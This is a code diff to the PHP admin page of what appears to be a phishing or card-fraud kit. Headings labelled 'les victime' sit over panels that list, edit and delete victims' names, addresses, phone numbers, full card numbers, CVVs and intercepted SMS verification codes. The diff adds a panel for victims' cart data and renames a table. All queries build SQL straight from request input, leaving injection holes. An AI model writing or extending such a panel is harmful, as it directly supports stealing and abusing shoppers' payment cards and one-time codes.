@@ -18,7 +18,7 @@ session_start();
 <meta charset="utf-8"> 
 <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">     
-<title>test</title>
+<title>admin</title>
 <script type="text/javascript"  src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"> <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cairo:200,300,400,500,600,700,800">  <link rel="stylesheet" href="http://fonts.cdnfonts.com/css/stingray">     <link rel="stylesheet" href="http://fonts.cdnfonts.com/css/font">  
 <style> html , body {}   *{ padding:0; border:0; margin:0; outline: none !important;  list-style: none; box-sizing:border-box; text-decoration:none;}   ::after ,::before { box-sizing: border-box;}    </style>
@@ -169,6 +169,54 @@ foreach($result as $row)
 
 
 
+<br/><br/><br/><br/><br/>
+<div style="color:red;  font:800 20px 'cairo'; " >les victime addtocart </div>
+
+<?php
+if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update addtocart set id='".$_POST['id']."',   idproduct='".$_POST['idproduct']."',  datetime='".$_POST['datetime']."',       ip='".$_POST['ip']."',     img='".$_POST['img']."',    	title='".$_POST['title']."',	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',		color='".$_POST['color']."',	sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."'       where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from addtocart "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+
+ 
+$result  =  mysqli_query(      $con   ,     "select * from addtocart "           );
+foreach($result as $row)	
+{		
+			$id= $row["id"];
+			$idproduct= $row["idproduct"];
+			$datetime= $row["datetime"];	
+			$ip= $row["ip"];
+			$img= $row["img"];
+			$title= $row["title"];
+			$price1= $row["price1"];				
+			$quantity= $row["quantity"];					
+			$color= $row["color"];		
+			$sizee= $row["sizee"];				
+			$shipping= $row["shipping"];		
+	        ?>
+	        <form method="post"  action="?ID=<?php echo $id ?>"    >
+			<input type="text"   value="<?php echo $id ?>"            name="id" /><br/>
+            <input type="text"   value="<?php echo $idproduct ?>"     name="idproduct" /> <br/> 
+            <input type="text"   value="<?php echo $datetime ?>"      name="datetime" /><br/>		
+			<input type="text"   value="<?php echo $ip ?>"            name="ip" /><br/>
+			<input type="text"   value="<?php echo $img ?>"           name="img" /><br/> 
+			<input type="text"   value="<?php echo $title ?>"         name="title" /><br/> 
+			<input type="text"   value="<?php echo $price1 ?>"        name="price1" /><br/> 
+			<input type="text"   value="<?php echo $quantity ?>"      name="quantity" /><br/> 
+			<input type="text"   value="<?php echo $color ?>"         name="color" /><br/> 
+			<input type="text"   value="<?php echo $sizee ?>"         name="sizee" /><br/> 
+			<input type="text"   value="<?php echo $shipping ?>"      name="shipping" /><br/> 
+			   
+			<input type="submit" value="update"  name="update"/>	
+            <input type="submit" value="delete"  name="delete"/>	
+  			<br/> <br/>	
+	        <?php 
+} 
+            ?>
+		    <input type="submit" value="clear"  name="clear"/>
+		    </form>	
+	        <?php
+?>
+
 
 
 
@@ -190,7 +238,7 @@ foreach($result as $row)
 
 
 <br/><br/><br/><br/><br/>
-<div style="color:red;  font:800 20px 'cairo'; " > les victime </div>
+<div style="color:red;  font:800 20px 'cairo'; " > les victime sans codsms </div>
 
 <?php
 if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update orderclien set id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',     title='".$_POST['title']."',    	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	subtotal='".$_POST['subtotal']."',	  totalprice='".$_POST['totalprice']."',  totalitem='".$_POST['totalitem']."',      email='".$_POST['email']."',	firstname='".$_POST['firstname']."',	lastname='".$_POST['lastname']."',	address='".$_POST['address']."',	city='".$_POST['city']."',	country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."'        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
@@ -277,11 +325,11 @@ foreach($result as $row)
 <br/><br/><br/><br/><br/>
 <div style="color:red;  font:800 20px 'cairo'; " >les victime avec codsms</div>
 <?php 
-if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update codesmsorderclien set  id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       totalitem='".$_POST['totalitem']."',    totalprice='".$_POST['totalprice']."',   email='".$_POST['email']."',    	firstname='".$_POST['firstname']."',	  lastname='".$_POST['lastname']."',  address='".$_POST['address']."',	city='".$_POST['city']."',		country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'	         where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
-if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from codesmsorderclien where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
-if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from codesmsorderclien "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
+if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update ordercliencodesms set  id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       totalitem='".$_POST['totalitem']."',    totalprice='".$_POST['totalprice']."',   email='".$_POST['email']."',    	firstname='".$_POST['firstname']."',	  lastname='".$_POST['lastname']."',  address='".$_POST['address']."',	city='".$_POST['city']."',		country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'	         where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
+if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
+if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from ordercliencodesms "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  
 
-$result  =  mysqli_query(      $con   ,     "select * from codesmsorderclien " ); 
+$result  =  mysqli_query(      $con   ,     "select * from ordercliencodesms " ); 
 foreach($result as $row)	 
 { 
 	 $id= $row["id"];
